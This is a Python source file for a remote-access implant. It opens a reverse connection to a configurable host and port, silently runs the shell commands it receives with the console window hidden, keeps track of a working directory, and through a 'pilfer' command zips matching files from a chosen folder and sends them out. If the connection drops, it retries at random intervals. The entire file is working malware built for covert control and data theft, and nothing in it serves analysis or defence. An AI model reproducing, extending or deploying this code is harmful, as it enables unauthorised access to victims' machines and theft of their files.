# payload.py
# The Heartbeat Soul, now with Memory and True Sight.

import os
import sys
import time
import random
import socket
import subprocess
import threading
import zipfile
import tempfile

# --- DYNAMIC CONFIG ---
RHOST = "##RHOST##"
RPORT = ##RPORT##

# NEW: The soul now has a memory of its current location.
current_working_dir = os.getcwd()

def send_data(sock, data):
    """Sends data with a simple length header."""
    try:
        # We prepend the current working directory to every message.
        response = f"CWD:{current_working_dir}\n\n".encode() + data
        sock.sendall(str(len(response)).encode().zfill(16) + response)
    except:
        pass

def pilfer_files(sock, params):
    """
    Finds files, zips them, sends them, and cleans up.
    """
    try:
        # CORRECTION: Handle paths with or without quotes.
        if ' ' in params and (params.startswith('"') or params.startswith("'")):
            parts = params.split(' ', 1)
            path = parts[0].strip('\"\'')
            extensions_str = parts[1]
        else:
            path, extensions_str = params.split(' ', 1)
        
        path = os.path.abspath(os.path.join(current_working_dir, path)) # Handle relative paths

        extensions = [e.strip() for e in extensions_str.split(',')]
        all_files = "*" in extensions

        if not os.path.isdir(path):
            send_data(sock, b"[ERROR] The specified path does not exist or is not a directory.")
            return

        temp_dir = tempfile.gettempdir()
        zip_path = os.path.join(temp_dir, f"harvest_{random.randint(1000, 9999)}.zip")
        
        files_to_harvest = []
        for root, _, files in os.walk(path):
            for file in files:
                if all_files or any(file.lower().endswith(ext.lower()) for ext in extensions): # Case-insensitive check
                    file_path = os.path.join(root, file)
                    files_to_harvest.append(file_path)
        
        if not files_to_harvest:
            send_data(sock, b"[INFO] No files found matching criteria. Nothing to send.")
            return

        # Sending info messages without CWD header to avoid confusing the master control
        sock.sendall(str(len(b"[INFO]..._pre_")).encode().zfill(16) + b"[INFO]..._pre_") 

        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
            for file_path in files_to_harvest:
                try:
                    arcname = os.path.relpath(file_path, path)
                    zf.write(file_path, arcname)
                except:
                    continue
        
        with open(zip_path, 'rb') as f:
            file_data = f.read()
        
        file_header = f"FILE_TRANSFER_START:{len(file_data)}:harvest.zip".encode()
        send_data(sock, file_header)
        sock.sendall(file_data)
        
    except Exception as e:
        send_data(sock, f"[ERROR] Pilfer failed: {str(e)}".encode())
    finally:
        if os.path.exists(zip_path):
            os.remove(zip_path)


def run_conduit():
    global current_working_dir
    while True:
        try:
            s_obj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s_obj.connect((RHOST, RPORT))
            
            # Announce its arrival and current location
            send_data(s_obj, b"Soul connected.")
            
            while True:
                command_header = s_obj.recv(16)
                if not command_header: break
                
                command_len = int(command_header.decode().strip())
                command = s_obj.recv(command_len).decode().strip()

                if not command:
                    send_data(s_obj, b"")
                    continue
                
                # NEW: Intercept 'cd' command to manage state
                if command.lower().startswith("cd "):
                    try:
                        new_dir = command.split(' ', 1)[1].strip('\"\'')
                        # Handle changing drives like "cd C:"
                        if len(new_dir) == 2 and new_dir[1] == ':':
                            os.chdir(new_dir)
                        else:
                            # Use os.path.join to correctly handle relative/absolute paths
                            os.chdir(os.path.join(current_working_dir, new_dir))
                        
                        current_working_dir = os.getcwd()
                        send_data(s_obj, b"") # Send empty response to signal success
                    except FileNotFoundError:
                        send_data(s_obj, f"The system cannot find the path specified: {new_dir}".encode())
                    except Exception as e:
                        send_data(s_obj, str(e).encode())

                elif command.startswith("pilfer "):
                    pilfer_files(s_obj, command.split(' ', 1)[1])
                else:
                    CREATE_NO_WINDOW = 0x08000000
                    # NEW: Execute the command from the current working directory
                    proc = subprocess.Popen(command, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=CREATE_NO_WINDOW, cwd=current_working_dir)
                    stdout, stderr = proc.communicate()
                    
                    response = stdout + stderr
                    if not response:
                        response = b"\n"
                    
                    send_data(s_obj, response)

        except Exception:
            time.sleep(random.randint(30, 60))
            continue

if __name__ == "__main__":
    run_conduit()